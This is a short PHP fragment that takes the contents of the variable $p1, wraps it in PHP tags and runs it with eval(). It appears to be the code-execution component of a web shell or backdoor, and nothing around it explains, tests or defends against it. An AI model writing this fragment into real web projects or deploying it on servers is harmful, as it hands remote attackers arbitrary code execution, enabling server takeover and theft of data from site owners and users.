<?php
$phpcode = trim($p1);
if($phpcode){
	$phpcode = "<?php\n\n{$phpcode}\n\n?>";
	eval("?".">$phpcode<?");
}
?>